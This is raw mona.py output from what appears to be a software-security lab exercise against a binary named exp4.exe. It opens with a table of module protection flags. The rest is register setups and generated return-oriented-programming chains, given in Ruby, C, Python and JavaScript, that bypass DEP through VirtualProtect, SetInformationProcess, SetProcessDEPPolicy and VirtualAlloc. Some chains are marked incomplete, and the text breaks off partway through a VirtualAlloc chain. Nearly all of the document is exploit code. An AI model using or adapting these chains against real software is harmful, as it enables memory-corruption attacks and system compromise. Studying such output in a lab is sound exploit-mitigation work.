-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x76ca0000 | 0x76d4f000 | 0x000af000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [COMDLG32.dll] (C:\WINDOWS\System32\COMDLG32.dll)
 0x75f20000 | 0x75f9b000 | 0x0007b000 | True   | True    | True  |  False   | True   | 10.0.19041.789 [msvcp_win.dll] (C:\WINDOWS\System32\msvcp_win.dll)
 0x768f0000 | 0x769cc000 | 0x000dc000 | True   | True    | True  |  False   | True   | 10.0.19041.1110 [gdi32full.dll] (C:\WINDOWS\System32\gdi32full.dll)
 0x771e0000 | 0x7729f000 | 0x000bf000 | True   | True    | True  |  False   | True   | 7.0.19041.546 [msvcrt.dll] (C:\WINDOWS\System32\msvcrt.dll)
 0x6b620000 | 0x6b64c000 | 0x0002c000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [oledlg.dll] (C:\WINDOWS\SYSTEM32\oledlg.dll)
 0x777e0000 | 0x77983000 | 0x001a3000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [ntdll.dll] (C:\WINDOWS\SYSTEM32\ntdll.dll)
 0x76a30000 | 0x76aa5000 | 0x00075000 | True   | True    | True  |  False   | True   | 10.0.19041.320 [sechost.dll] (C:\WINDOWS\System32\sechost.dll)
 0x00400000 | 0x010b1000 | 0x00cb1000 | False  | False   | False |  False   | False  | 1.0.0.1 [exp4.exe] (C:\Users\86176\Desktop\software-security\exp4.exe)
 0x776a0000 | 0x77790000 | 0x000f0000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [KERNEL32.DLL] (C:\WINDOWS\System32\KERNEL32.DLL)
 0x775a0000 | 0x77683000 | 0x000e3000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [ole32.dll] (C:\WINDOWS\System32\ole32.dll)
 0x76c50000 | 0x76c95000 | 0x00045000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [SHLWAPI.dll] (C:\WINDOWS\System32\SHLWAPI.dll)
 0x76fc0000 | 0x77160000 | 0x001a0000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [USER32.dll] (C:\WINDOWS\System32\USER32.dll)
 0x772a0000 | 0x772c5000 | 0x00025000 | True   | True    | True  |  False   | True   | 10.0.19041.546 [IMM32.dll] (C:\WINDOWS\System32\IMM32.dll)
 0x76660000 | 0x768e1000 | 0x00281000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [combase.dll] (C:\WINDOWS\System32\combase.dll)
 0x76de0000 | 0x76f00000 | 0x00120000 | True   | True    | True  |  False   | True   | 10.0.19041.789 [ucrtbase.dll] (C:\WINDOWS\System32\ucrtbase.dll)
 0x75760000 | 0x757f6000 | 0x00096000 | True   | True    | True  |  False   | True   | 10.0.19041.985 [OLEAUT32.dll] (C:\WINDOWS\System32\OLEAUT32.dll)
 0x75800000 | 0x75818000 | 0x00018000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [win32u.dll] (C:\WINDOWS\System32\win32u.dll)
 0x75910000 | 0x75ec3000 | 0x005b3000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [SHELL32.dll] (C:\WINDOWS\System32\SHELL32.dll)
 0x76f00000 | 0x76fbf000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [RPCRT4.dll] (C:\WINDOWS\System32\RPCRT4.dll)
 0x75880000 | 0x75907000 | 0x00087000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [shcore.dll] (C:\WINDOWS\System32\shcore.dll)
 0x74510000 | 0x7459d000 | 0x0008d000 | True   | True    | True  |  False   | True   | 5.82 [COMCTL32.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_c0da534e38c01f4d\COMCTL32.dll)
 0x77380000 | 0x77595000 | 0x00215000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [KERNELBASE.dll] (C:\WINDOWS\System32\KERNELBASE.dll)
 0x73af0000 | 0x73b18000 | 0x00028000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [WINMM.dll] (C:\WINDOWS\SYSTEM32\WINMM.dll)
 0x77350000 | 0x77374000 | 0x00024000 | True   | True    | True  |  False   | True   | 10.0.19041.1202 [GDI32.dll] (C:\WINDOWS\System32\GDI32.dll)
 0x71790000 | 0x71804000 | 0x00074000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [UxTheme.dll] (C:\WINDOWS\SYSTEM32\UxTheme.dll)
 0x71810000 | 0x71882000 | 0x00072000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [WINSPOOL.DRV] (C:\WINDOWS\SYSTEM32\WINSPOOL.DRV)
 0x772d0000 | 0x7734a000 | 0x0007a000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [ADVAPI32.dll] (C:\WINDOWS\System32\ADVAPI32.dll)
 0x71890000 | 0x71896000 | 0x00006000 | True   | True    | True  |  False   | True   | 10.0.19041.546 [MSIMG32.dll] (C:\WINDOWS\SYSTEM32\MSIMG32.dll)
 0x73ef0000 | 0x74059000 | 0x00169000 | True   | True    | True  |  False   | True   | 10.0.19041.1288 [gdiplus.dll] (C:\WINDOWS\WinSxS\x86_microsoft.windows.gdiplus_6595b64144ccf1df_1.1.19041.1288_none_d9539a9fe102720c\gdiplus.dll)
 0x71710000 | 0x71763000 | 0x00053000 | True   | True    | True  |  False   | True   | 7.2.19041.746 [OLEACC.dll] (C:\WINDOWS\SYSTEM32\OLEACC.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x00dd4499,  # POP ECX # RETN [exp4.exe] 
      0x00f00688,  # ptr to &VirtualProtect() [IAT exp4.exe]
      0x00dc7799,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe] 
      0x00b23eea,  # XCHG EAX,ESI # RETN [exp4.exe] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x00806159,  # POP EBP # RETN [exp4.exe] 
      0x0089a861,  # & jmp esp [exp4.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00b29006,  # POP EBX # RETN [exp4.exe] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00b13264,  # POP EDX # RETN [exp4.exe] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00e13f27,  # POP ECX # RETN [exp4.exe] 
      0x00efc8a9,  # &Writable location [exp4.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x0089ca01,  # POP EDI # RETN [exp4.exe] 
      0x00b13e04,  # RETN (ROP NOP) [exp4.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x00c357f5,  # POP EAX # RETN [exp4.exe] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00b250d2,  # PUSHAD # RETN [exp4.exe] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x00dd4499,  // POP ECX // RETN [exp4.exe] 
      0x00f00688,  // ptr to &VirtualProtect() [IAT exp4.exe]
      0x00dc7799,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [exp4.exe] 
      0x00b23eea,  // XCHG EAX,ESI // RETN [exp4.exe] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x00806159,  // POP EBP // RETN [exp4.exe] 
      0x0089a861,  // & jmp esp [exp4.exe]
      //[---INFO:gadgets_to_set_ebx:---]
      0x00b29006,  // POP EBX // RETN [exp4.exe] 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x00b13264,  // POP EDX // RETN [exp4.exe] 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x00e13f27,  // POP ECX // RETN [exp4.exe] 
      0x00efc8a9,  // &Writable location [exp4.exe]
      //[---INFO:gadgets_to_set_edi:---]
      0x0089ca01,  // POP EDI // RETN [exp4.exe] 
      0x00b13e04,  // RETN (ROP NOP) [exp4.exe]
      //[---INFO:gadgets_to_set_eax:---]
      0x00c357f5,  // POP EAX // RETN [exp4.exe] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x00b250d2,  // PUSHAD // RETN [exp4.exe] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x00dd4499,  # POP ECX # RETN [exp4.exe] 
      0x00f00688,  # ptr to &VirtualProtect() [IAT exp4.exe]
      0x00dc7799,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe] 
      0x00b23eea,  # XCHG EAX,ESI # RETN [exp4.exe] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x00806159,  # POP EBP # RETN [exp4.exe] 
      0x0089a861,  # & jmp esp [exp4.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00b29006,  # POP EBX # RETN [exp4.exe] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00b13264,  # POP EDX # RETN [exp4.exe] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00e13f27,  # POP ECX # RETN [exp4.exe] 
      0x00efc8a9,  # &Writable location [exp4.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x0089ca01,  # POP EDI # RETN [exp4.exe] 
      0x00b13e04,  # RETN (ROP NOP) [exp4.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x00c357f5,  # POP EAX # RETN [exp4.exe] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00b250d2,  # PUSHAD # RETN [exp4.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u4499%u00dd" + // 0x00dd4499 : ,# POP ECX # RETN [exp4.exe] 
    "%u0688%u00f0" + // 0x00f00688 : ,# ptr to &VirtualProtect() [IAT exp4.exe]
    "%u7799%u00dc" + // 0x00dc7799 : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe] 
    "%u3eea%u00b2" + // 0x00b23eea : ,# XCHG EAX,ESI # RETN [exp4.exe] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u6159%u0080" + // 0x00806159 : ,# POP EBP # RETN [exp4.exe] 
    "%ua861%u0089" + // 0x0089a861 : ,# & jmp esp [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u9006%u00b2" + // 0x00b29006 : ,# POP EBX # RETN [exp4.exe] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u3264%u00b1" + // 0x00b13264 : ,# POP EDX # RETN [exp4.exe] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u3f27%u00e1" + // 0x00e13f27 : ,# POP ECX # RETN [exp4.exe] 
    "%uc8a9%u00ef" + // 0x00efc8a9 : ,# &Writable location [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%uca01%u0089" + // 0x0089ca01 : ,# POP EDI # RETN [exp4.exe] 
    "%u3e04%u00b1" + // 0x00b13e04 : ,# RETN (ROP NOP) [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u57f5%u00c3" + // 0x00c357f5 : ,# POP EAX # RETN [exp4.exe] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u50d2%u00b2" + // 0x00b250d2 : ,# PUSHAD # RETN [exp4.exe] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find API pointer -> ebx
      0x00bc61d5,  # MOV EBP,DWORD PTR DS:[EBX] # MOV EAX,5DE58BFF # RETN 0x04 [exp4.exe] 
      #[---INFO:gadgets_to_set_edx:---]
      0x00b29091,  # POP EDX # RETN [exp4.exe] 
      0x41414141,  # Filler (RETN offset compensation)
      0x00000022,  # 0x00000022-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00e0041a,  # POP ECX # RETN [exp4.exe] 
      0x00400309,  # &0x00000002 [exp4.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d350de,  # POP EBX # RETN [exp4.exe] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x00b1ebc3,  # POP EAX # RETN [exp4.exe] 
      0x00000004,  # 0x00000004-> eax
      #[---INFO:gadgets_to_set_edi:---]
      0x00d21751,  # POP EDI # RETN [exp4.exe] 
      0x00d21751,  # skip 4 bytes [exp4.exe]
      #[---INFO:pushad:---]
      0x00b24bb4,  # PUSHAD # RETN [exp4.exe] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  // [-] Unable to find API pointer -> ebx
      0x00bc61d5,  // MOV EBP,DWORD PTR DS:[EBX] // MOV EAX,5DE58BFF // RETN 0x04 [exp4.exe] 
      //[---INFO:gadgets_to_set_edx:---]
      0x00b29091,  // POP EDX // RETN [exp4.exe] 
      0x41414141,  // Filler (RETN offset compensation)
      0x00000022,  // 0x00000022-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x00e0041a,  // POP ECX // RETN [exp4.exe] 
      0x00400309,  // &0x00000002 [exp4.exe]
      //[---INFO:gadgets_to_set_ebx:---]
      0x00d350de,  // POP EBX // RETN [exp4.exe] 
      0xffffffff,  // 0xffffffff-> ebx
      //[---INFO:gadgets_to_set_eax:---]
      0x00b1ebc3,  // POP EAX // RETN [exp4.exe] 
      0x00000004,  // 0x00000004-> eax
      //[---INFO:gadgets_to_set_edi:---]
      0x00d21751,  // POP EDI // RETN [exp4.exe] 
      0x00d21751,  // skip 4 bytes [exp4.exe]
      //[---INFO:pushad:---]
      0x00b24bb4,  // PUSHAD // RETN [exp4.exe] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find API pointer -> ebx
      0x00bc61d5,  # MOV EBP,DWORD PTR DS:[EBX] # MOV EAX,5DE58BFF # RETN 0x04 [exp4.exe] 
      #[---INFO:gadgets_to_set_edx:---]
      0x00b29091,  # POP EDX # RETN [exp4.exe] 
      0x41414141,  # Filler (RETN offset compensation)
      0x00000022,  # 0x00000022-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00e0041a,  # POP ECX # RETN [exp4.exe] 
      0x00400309,  # &0x00000002 [exp4.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00d350de,  # POP EBX # RETN [exp4.exe] 
      0xffffffff,  # 0xffffffff-> ebx
      #[---INFO:gadgets_to_set_eax:---]
      0x00b1ebc3,  # POP EAX # RETN [exp4.exe] 
      0x00000004,  # 0x00000004-> eax
      #[---INFO:gadgets_to_set_edi:---]
      0x00d21751,  # POP EDI # RETN [exp4.exe] 
      0x00d21751,  # skip 4 bytes [exp4.exe]
      #[---INFO:pushad:---]
      0x00b24bb4,  # PUSHAD # RETN [exp4.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> ebx
    "%u61d5%u00bc" + // 0x00bc61d5 : ,# MOV EBP,DWORD PTR DS:[EBX] # MOV EAX,5DE58BFF # RETN 0x04 [exp4.exe] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u9091%u00b2" + // 0x00b29091 : ,# POP EDX # RETN [exp4.exe] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
    "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u041a%u00e0" + // 0x00e0041a : ,# POP ECX # RETN [exp4.exe] 
    "%u0309%u0040" + // 0x00400309 : ,# &0x00000002 [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u50de%u00d3" + // 0x00d350de : ,# POP EBX # RETN [exp4.exe] 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%uebc3%u00b1" + // 0x00b1ebc3 : ,# POP EAX # RETN [exp4.exe] 
    "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u1751%u00d2" + // 0x00d21751 : ,# POP EDI # RETN [exp4.exe] 
    "%u1751%u00d2" + // 0x00d21751 : ,# skip 4 bytes [exp4.exe]
    "" + // #[---INFO:pushad:---] : 
    "%u4bb4%u00b2" + // 0x00b24bb4 : ,# PUSHAD # RETN [exp4.exe] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
      #[---INFO:gadgets_to_set_ebx:---]
      0x00dd9042,  # POP EBX # RETN [exp4.exe] 
      0x00400011,  # &0x00000000 [exp4.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x00d21123,  # POP EDI # RETN [exp4.exe] 
      0x00d21123,  # skip 4 bytes [exp4.exe]
      #[---INFO:pushad:---]
      0x00b24bb4,  # PUSHAD # RETN [exp4.exe] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
      //[---INFO:gadgets_to_set_ebx:---]
      0x00dd9042,  // POP EBX // RETN [exp4.exe] 
      0x00400011,  // &0x00000000 [exp4.exe]
      //[---INFO:gadgets_to_set_edi:---]
      0x00d21123,  // POP EDI // RETN [exp4.exe] 
      0x00d21123,  // skip 4 bytes [exp4.exe]
      //[---INFO:pushad:---]
      0x00b24bb4,  // PUSHAD // RETN [exp4.exe] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_ebp:---]
      0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
      #[---INFO:gadgets_to_set_ebx:---]
      0x00dd9042,  # POP EBX # RETN [exp4.exe] 
      0x00400011,  # &0x00000000 [exp4.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x00d21123,  # POP EDI # RETN [exp4.exe] 
      0x00d21123,  # skip 4 bytes [exp4.exe]
      #[---INFO:pushad:---]
      0x00b24bb4,  # PUSHAD # RETN [exp4.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u9042%u00dd" + // 0x00dd9042 : ,# POP EBX # RETN [exp4.exe] 
    "%u0011%u0040" + // 0x00400011 : ,# &0x00000000 [exp4.exe]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u1123%u00d2" + // 0x00d21123 : ,# POP EDI # RETN [exp4.exe] 
    "%u1123%u00d2" + // 0x00d21123 : ,# skip 4 bytes [exp4.exe]
    "" + // #[---INFO:pushad:---] : 
    "%u4bb4%u00b2" + // 0x00b24bb4 : ,# PUSHAD # RETN [exp4.exe] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x0077c565,  # POP ECX # RETN [exp4.exe] 
      0x00f00560,  # ptr to &VirtualAlloc() [IAT exp4.exe]
      0x00da2b0c,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [exp4.exe] 
      0x00b23eea,  # XCHG EAX,ESI # RETN [exp4.exe] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x0082039c,  # POP EBP # RETN [exp4.exe] 
      0x008f880d,  # & jmp esp [exp4.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x007b4899,  # POP EBX # RETN [exp4.exe] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x00d8e950,  # POP EDX # RETN [exp4.exe] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x00b62c35,  # POP ECX # RETN [exp4.exe] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x0096c6d6,  # POP EDI # RETN [exp4.exe] 
      0x00b13e04,  # RETN (ROP NOP) [exp4.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x00b12f47,  # POP EAX # RETN [exp4.exe] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00b4a826,  # PUSHAD # RETN [exp4.exe] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x0077c565,  // POP ECX // RETN [exp4.exe] 
      0x00f00560,  // ptr to &VirtualAlloc() [IAT exp4.exe]
      0x00da2b0c,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [exp4.exe] 
      0x00b23eea,  // XCHG EAX,ESI // RETN [exp4.exe] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x0082039c,  // POP EBP // RETN [exp4.exe] 
      0x008f880d,  // & jmp esp [exp4.exe]
      //[---INFO:gadgets_to_set_ebx:---]
      0x007b4899,  // POP EBX // RETN [exp4.exe] 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x00d8e950,  // POP EDX // RETN [exp4.exe] 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x00b62c35,  // POP ECX // RETN [exp4.exe] 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x0096c6d6,  // POP EDI // RETN [exp4.exe] 
      0x00b13e04,  // RETN (ROP NOP) [exp4.exe]
      //[---INFO:gadgets_to_set_eax:---]
      0x00b12f47,  // POP EAX // RETN [exp4.exe] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x00b4a826,  // PUSHAD // RETN [exp4.exe] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x0077c565,  # POP ECX # RETN [exp4.exe] 
